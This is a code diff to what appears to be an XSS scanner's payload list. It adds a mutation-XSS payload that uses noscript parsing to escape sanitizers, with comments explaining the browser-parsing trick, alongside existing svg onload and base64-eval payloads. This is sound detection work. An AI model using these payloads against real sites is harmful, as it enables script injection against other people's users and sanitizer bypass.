@@ -86,6 +86,17 @@ func htmlTextExecLadder() []xssExecPayload {
 		{`<svg onload=(alert)(document.domain)>`, "svg", "(alert)"},
 		{"<svg onload=top[`al`+`ert`](document.domain)>", "svg", "onload"},
 		{`<svg onload=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>`, "svg", "eval("},
+		// ── mutation XSS (mXSS): the browser's own re-parsing behavior — not a
+		// string trick — turns "inert" markup into a live element. <noscript> is
+		// parsed as RAW TEXT only when the scripting flag is enabled (an ordinary
+		// browser tab); a static/offline parser or a sanitizer's inert document
+		// commonly parses it as regular markup instead. So the literal
+		// "</noscript>" sequence sitting inside what looks like a quoted
+		// attribute value actually closes the tag early in a real browser, and
+		// everything after it becomes live markup — cure53/PortSwigger mXSS
+		// research. Deliberately harmless against a static parser (no early
+		// close ⇒ inert text, no false positive); only a real browser proves it.
+		{`<noscript><p title="</noscript><img src=x onerror=` + xssAlert + `>">`, "img", "onerror"},
 	}
 }
 
